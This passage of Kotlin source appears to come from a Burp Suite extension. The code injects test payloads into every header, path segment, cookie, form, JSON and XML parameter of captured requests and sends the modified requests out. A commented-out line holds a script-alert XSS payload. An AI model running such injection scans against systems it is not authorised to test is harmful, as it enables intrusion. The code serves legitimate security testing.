//                        val headerExceptions = listOf("Content-Length")
//
//                        for (header in currentRequest.headers()) {
//                            if(!headerExceptions.contains(header.name())) {
//                                val modifiedRequest = currentRequest.withRemovedHeader(header)
//                                val httpRequestResponseResult = sendRequestConsiderSettings(modifiedRequest)
//                                if (responsesAreSimilar(originalResponse, httpRequestResponseResult.response()))
//                                    currentRequest = modifiedRequest
//                            }
//                        }
//
//                        val supportedParamaterTypes = listOf(
//                            HttpParameterType.BODY,
//                            HttpParameterType.URL,
//                            HttpParameterType.COOKIE,
//                            HttpParameterType.MULTIPART_ATTRIBUTE
//                        )
//                        for (parameter in currentRequest.parameters()) {
//
//                            if (supportedParamaterTypes.contains(parameter.type())) {
//                                val modifiedRequest = currentRequest.withRemovedParameters(parameter)
//                                val httpRequestResponseResult = sendRequestConsiderSettings(modifiedRequest)
//                                if (responsesAreSimilar(originalResponse, httpRequestResponseResult.response()))
//                                    currentRequest = modifiedRequest
//                            }
//                            else {
//                                val modifiedRequest =  currentRequest.withUpdatedParsedParameterValue(
//                                    parameter,
//                                    "",
//                                    PayloadUpdateMode.REPLACE
//                                )
//                                val httpRequestResponseResult = sendRequestConsiderSettings(modifiedRequest)
//                                if (responsesAreSimilar(originalResponse, httpRequestResponseResult.response()))
//                                    currentRequest = modifiedRequest
//                            }
//
//                        }
//
//                        api.repeater().sendToRepeater(currentRequest)
//                        api.comparer().sendToComparer(originalRequest.toByteArray(),currentRequest.toByteArray())
//                    }
//                } else
//                    logger.errorLog("Skipping mimize request because it doesn't have a response to compare to")
//            }
//        }
//        //iterateThroughParametersWithPayload(myHttpRequestResponses,"'\"＞＜script＞alert(1)＜/script＞asdfutf7",PayloadUpdateMode.APPEND, "XSS UTF7")
//        logger.debugLog("Exit")
//    }

//    fun responsesAreSimilar(originalResponse: HttpResponse, currentResponse : HttpResponse) : Boolean
//    {
//        return (originalResponse.statusCode()==currentResponse.statusCode()) &&
//                (originalResponse.reasonPhrase()==currentResponse.reasonPhrase()) &&
//                (originalResponse.statedMimeType()==currentResponse.statedMimeType()) &&
//                originalResponse.body().length()>0 == currentResponse.body().length()>0
//    }
    // endregion



    fun iterateThroughParametersWithPayload(httpRequestResponses : List<HttpRequestResponse>, testCaseCategory: String, testCaseName: String, payload : String, payloadUpdateMode : PayloadUpdateMode)
    {
        logger.debugLog("Enter")

        val skipHeaders = getHeadersToSkip()

        for(httpRequestResponse in httpRequestResponses)
        {
            val httpRequest = httpRequestResponse.request()
            logger.debugLog("Found request: ${httpRequest.url()}")

            for(header in httpRequest.headers()) {
                val headerName = header.name()
                val headerValue = header.value()
                logger.debugLog("Found header: $headerName, $headerValue")
                if(!skipHeaders.contains(headerName.lowercase())) {
                    //sendRequest(httpRequest.withUpdatedHeader(header.name(),api.utilities().urlUtils().encode(payload)),"header: ${header.name()}: $annotation")
                    val updatedValue = transformPayload(headerValue,payload,payloadUpdateMode)
                    val testCase = labelTestCase(httpRequest.withUpdatedHeader(headerName,updatedValue),testCaseCategory,testCaseName,
                        ParameterType.HTTP_HEADER.value,headerName,payload)
                    sendRequestConsiderSettings(testCase)
                }
            }

            sendRequestConsiderSettings(
                labelTestCase(httpRequest.withUpdatedHeader("Authorization","Basic "+api.utilities().base64Utils().encode("$payload:$payload")),
                    testCaseCategory,testCaseName, ParameterType.HTTP_HEADER.value,"Authorization Basic",payload)
            )

            replaceAllPathSlicesAndLabel(httpRequest,testCaseCategory,testCaseName) { slice ->
                api.utilities().urlUtils().encode(transformPayload(api.utilities().urlUtils().decode(slice.value),payload,payloadUpdateMode))
            }.forEach { request ->
                sendRequestConsiderSettings(request)
            }

            for(parameter in httpRequest.parameters())
            {
                logger.debugLog("Found param: ${parameter.name()}, ${parameter.type()}, ${parameter.value()}")
                logger.debugLog("Regex of ignored values:\n${myExtensionSettings.ignoreParametersSetting}")


                if(myExtensionSettings.ignoreParametersSetting.isBlank() || !myExtensionSettings.ignoreParametersSetting.toRegex(RegexOption.IGNORE_CASE).matches(parameter.name())) {
                    when (parameter.type()) {
                        HttpParameterType.URL -> {
                            val paramName = parameter.name()
                            val testCase = labelTestCase(httpRequest.withUpdatedParameters(
                                createUpdatedParameter(
                                    parameter,
                                    payload,
                                    payloadUpdateMode
                                )
                            ), testCaseCategory,testCaseName, ParameterType.URL_PARAMETER.value,paramName,payload)
                            sendRequestConsiderSettings(testCase)

                            val testCase2 = labelTestCase(httpRequest.withUpdatedParameters(
                                createUpdatedParameter(
                                    parameter,
                                    payload,
                                    payloadUpdateMode,
                                    false
                                )
                            ), testCaseCategory,testCaseName, ParameterType.URL_PARAMETER.value,paramName,payload)
                            sendRequestConsiderSettings(testCase2)
                        }

                        HttpParameterType.BODY ->
                        {
                            val paramName = parameter.name()
                            val testCase = labelTestCase(httpRequest.withUpdatedParameters(
                                createUpdatedParameter(
                                    parameter,
                                    payload,
                                    payloadUpdateMode
                                )
                            ), testCaseCategory,testCaseName, ParameterType.POST_PARAMETER.value,paramName,payload)
                            sendRequestConsiderSettings(testCase)
                        }

                        HttpParameterType.COOKIE ->
                        {
                            val paramName = parameter.name()
                            val testCase = labelTestCase(httpRequest.withUpdatedParameters(
                                createUpdatedParameter(
                                    parameter,
                                    payload,
                                    payloadUpdateMode
                                )
                            ), testCaseCategory,testCaseName, ParameterType.COOKIE.value,paramName,payload)
                            sendRequestConsiderSettings(testCase)
                        }

                        HttpParameterType.MULTIPART_ATTRIBUTE ->
                        {
                            val paramName = parameter.name()
                            val testCase = labelTestCase(httpRequest.withUpdatedParameters(
                                createUpdatedParameter(
                                    parameter,
                                    payload,
                                    payloadUpdateMode
                                )
                            ), testCaseCategory,testCaseName, ParameterType.MULTI_PART.value,paramName,payload)
                            sendRequestConsiderSettings(testCase)
                        }

                        HttpParameterType.JSON -> {
                            /*api.logging().logToOutput("Name: ${parameter.name()}")
                            api.logging().logToOutput("Name Start Index Inclusive: ${parameter.nameOffsets().startIndexInclusive()}")
                            api.logging().logToOutput("Name End Index Exclusive: ${parameter.nameOffsets().endIndexExclusive()}")
                            api.logging().logToOutput("Substring of Name: ${httpRequest.toString().substring(parameter.nameOffsets().startIndexInclusive(),parameter.nameOffsets().endIndexExclusive())}")
                            api.logging().logToOutput("Value: ${parameter.value()}")
                            api.logging().logToOutput("Value Start Index Inclusive: ${parameter.valueOffsets().startIndexInclusive()}")
                            api.logging().logToOutput("Value End Index Exclusive: ${parameter.valueOffsets().endIndexExclusive()}")
                            api.logging().logToOutput("Substring of Value: ${httpRequest.toString().substring(parameter.valueOffsets().startIndexInclusive(),parameter.valueOffsets().endIndexExclusive())}")
                            api.logging().logToOutput("Before Value: ${httpRequest.toString().substring(0,parameter.valueOffsets().startIndexInclusive())}")
                            api.logging().logToOutput("After Value: ${httpRequest.toString().substring(parameter.valueOffsets().endIndexExclusive(),httpRequest.toString().length)}")
                            api.logging().logToOutput("Prepend Test: ${httpRequest.toString().substring(0,parameter.valueOffsets().startIndexInclusive())}PREPEND!!!${httpRequest.toString().substring(parameter.valueOffsets().startIndexInclusive())}")
                            api.logging().logToOutput("Append Test: ${httpRequest.toString().substring(0,parameter.valueOffsets().endIndexExclusive())}APPEND!!!${httpRequest.toString().substring(parameter.valueOffsets().endIndexExclusive())}")
                            api.logging().logToOutput("Replace Test: ${httpRequest.toString().substring(0,parameter.valueOffsets().startIndexInclusive())}REPLACE!!!${httpRequest.toString().substring(parameter.valueOffsets().endIndexExclusive())}")*/
                            val testCase = labelTestCase(insertPayloadIntoUnsupportedParameterType(httpRequest,parameter,payload,payloadUpdateMode),
                                testCaseCategory,testCaseName, ParameterType.JSON_PARAMETER.value,parameter.name(),payload)
                            sendRequestConsiderSettings(testCase)
                        }

                        HttpParameterType.XML,HttpParameterType.XML_ATTRIBUTE -> {
                            val testCase = labelTestCase(insertPayloadIntoUnsupportedParameterType(httpRequest,parameter,payload,payloadUpdateMode),
                                testCaseCategory,testCaseName, ParameterType.XML.value,parameter.name(),payload)
                            sendRequestConsiderSettings(testCase)

                            val testCase2 = labelTestCase(insertPayloadIntoUnsupportedParameterType(httpRequest,parameter,payload,payloadUpdateMode,false),
                                testCaseCategory,testCaseName, ParameterType.XML.value,parameter.name(),payload)
                            sendRequestConsiderSettings(testCase2)

                            val testCase3 = labelTestCase(insertPayloadIntoUnsupportedParameterType(httpRequest,parameter,"<![CDATA[$payload]]>",payloadUpdateMode,false),
                                testCaseCategory,testCaseName, ParameterType.XML.value,parameter.name(),"<![CDATA[$payload]]>")
                            sendRequestConsiderSettings(testCase3)

                            if(payloadUpdateMode!=PayloadUpdateMode.REPLACE) {
                                val testCase4 = labelTestCase(insertPayloadIntoUnsupportedParameterType(httpRequest,parameter,payload,payloadUpdateMode),
                                    testCaseCategory,testCaseName, ParameterType.XML.value,parameter.name(),payload)
                                sendRequestConsiderSettings(testCase4)

                                val testCase5 = labelTestCase(insertPayloadIntoUnsupportedParameterType(httpRequest,parameter,payload,payloadUpdateMode,false),
                                    testCaseCategory,testCaseName, ParameterType.XML.value,parameter.name(),payload)
                                sendRequestConsiderSettings(testCase5)
                            }
                        }
                        else -> Unit
                    }
                }
                else
                    logger.debugLog("Skipping ${parameter.name()}")

            }
        }
        logger.debugLog("Exit")
    }

    fun createUpdatedParameter(parsedParameter : ParsedHttpParameter, payload : String, payloadUpdateMode : PayloadUpdateMode, encodePayload: Boolean = true) : HttpParameter {
        logger.debugLog("Enter")
        val paramName = parsedParameter.name()
        val typesRequiringURLEncoding = listOf(HttpParameterType.URL.name,HttpParameterType.BODY.name)
        val paramValue = if(typesRequiringURLEncoding.contains(parsedParameter.type().name)) {
            api.utilities().urlUtils().decode(parsedParameter.value())
        }
        else {
            parsedParameter.value()
        }
        val transformedPayload = transformPayload(paramValue,payload,payloadUpdateMode)

        val encodedTransformedPayload = if(encodePayload) {
            if(typesRequiringURLEncoding.contains(parsedParameter.type().name)) {
                api.utilities().urlUtils().encode(transformedPayload)
            }
            else {
                transformedPayload
            }
        }
        else {
            transformedPayload
        }

        return HttpParameter.parameter(paramName, encodedTransformedPayload, parsedParameter.type())
    }




//    fun insertPayloadAccordingToType(parsedParameter : ParsedHttpParameter,encodedPayload : String,payloadType : PayloadUpdateMode) : String {
//        when (payloadType) {
//            PayloadUpdateMode.PREPEND -> return encodedPayload + parsedParameter.value()
//            PayloadUpdateMode.INSERT_MIDDLE -> {
//                val parsedParamValLength = parsedParameter.value().length
//                if (parsedParamValLength > 1) {
//                    return parsedParameter.value()
//                        .substring(0, parsedParamValLength / 2) + encodedPayload + parsedParameter.value()
//                        .substring(parsedParamValLength / 2 + 1)
//                }
//                return encodedPayload + parsedParameter.value()
//            }
//
//            PayloadUpdateMode.APPEND -> return parsedParameter.value() + encodedPayload
//            else -> return encodedPayload
//        }
//    }

    fun transformPayload(originalValue: String, payload: String, payloadMode : PayloadUpdateMode): String {
        when (payloadMode) {
            PayloadUpdateMode.PREPEND -> return payload + originalValue
            PayloadUpdateMode.INSERT_MIDDLE -> {
                val originalValLength = originalValue.length
                if (originalValLength > 1) {
                    return originalValue
                        .substring(0, originalValLength / 2) + payload + originalValue
                        .substring(originalValLength / 2 + 1)
                }
                return payload + originalValue
            }

            PayloadUpdateMode.APPEND -> return originalValue + payload
            else -> return payload
        }
    }

    fun insertPayloadIntoUnsupportedParameterType(request : HttpRequest, parsedParameter : ParsedHttpParameter, payload: String, payloadUpdateMode : PayloadUpdateMode = PayloadUpdateMode.REPLACE, encodePayload : Boolean = true) : HttpRequest {
        val updatedParsedParam = request.parameters().find { it.name()==parsedParameter.name() && it.type() == parsedParameter.type() && it.value()==parsedParameter.value() }



        if(updatedParsedParam!=null) {
            val requestAsString = request.toString()

            val decodedOriginalValue = if(updatedParsedParam.type().name==HttpParameterType.JSON.name) {
                StringEscapeUtils.unescapeEcmaScript(updatedParsedParam.value())
            }
            else if(updatedParsedParam.type().name==HttpParameterType.XML.name || updatedParsedParam.type().name==HttpParameterType.XML_ATTRIBUTE.name) {
                StringEscapeUtils.unescapeXml(updatedParsedParam.value())
            }
            else {
                updatedParsedParam.value()
            }


            val transformedPayload = transformPayload(decodedOriginalValue,payload,payloadUpdateMode)

            val encodedPayload = if(encodePayload) {
                if(updatedParsedParam.type().name==HttpParameterType.JSON.name) {
                    StringEscapeUtils.escapeEcmaScript(transformedPayload)
                }
                else if(updatedParsedParam.type().name==HttpParameterType.XML.name || updatedParsedParam.type().name==HttpParameterType.XML_ATTRIBUTE.name) {
                    StringEscapeUtils.escapeXml11(transformedPayload)
                }
                else {
                    transformedPayload
                }
            }
            else {
                transformedPayload
            }

            val updatedRequestWithTestCase = requestAsString.replaceRange(updatedParsedParam.valueOffsets().startIndexInclusive(),updatedParsedParam.valueOffsets().endIndexExclusive(),encodedPayload)
            return HttpRequest.httpRequest(request.httpService(),updatedRequestWithTestCase)

        }
        return request
    }


    // region Send Request
//    fun sendRequest(httpRequest : HttpRequest, annotation : String)
//    {
//        logger.debugLog("Enter")
//
//            val annotatedHttpRequest = httpRequest.withAddedHeader("x-everyparam",api.utilities().base64Utils().encode(annotation,Base64EncodingOptions.URL).toString())
//            sendRequestConsiderSettings(annotatedHttpRequest)
//
//        }
//        logger.debugLog("Exit")
//    }

    fun sendRequestConsiderSettings(httpRequest : HttpRequest) {
        executor.submit {
            if (myExtensionSettings.followRedirectSetting)
                api.http().sendRequestWithUpdatedContentLength(
                    httpRequest,
                    RequestOptions.requestOptions().withRedirectionMode(RedirectionMode.ALWAYS)
                )
            else
                api.http().sendRequestWithUpdatedContentLength(httpRequest)
        }
    }
    // endregion

}

